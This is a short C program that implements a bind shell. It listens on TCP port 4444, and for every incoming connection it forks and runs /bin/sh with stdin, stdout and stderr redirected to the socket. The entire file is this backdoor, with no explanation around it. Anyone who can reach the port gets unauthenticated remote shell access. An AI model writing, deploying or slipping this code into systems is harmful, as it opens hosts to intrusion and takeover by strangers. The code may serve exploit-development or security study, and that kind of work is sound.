#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

void main(void)
{
    int sockfd, newsockfd, portno, pid;
    struct sockaddr_in serv_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    portno = 4444;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(portno);

    bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr));

    listen(sockfd, 5);

    while(1)
    {
        newsockfd = accept(sockfd, 0, 0);

        if( (pid = fork()) == 0 )
        {
            dup2(newsockfd, 0); // bind stdin
            dup2(newsockfd, 1); // bind stdout
            dup2(newsockfd, 2); // bind stderr

            execve("/bin/sh", 0, 0);
        }
    }
}
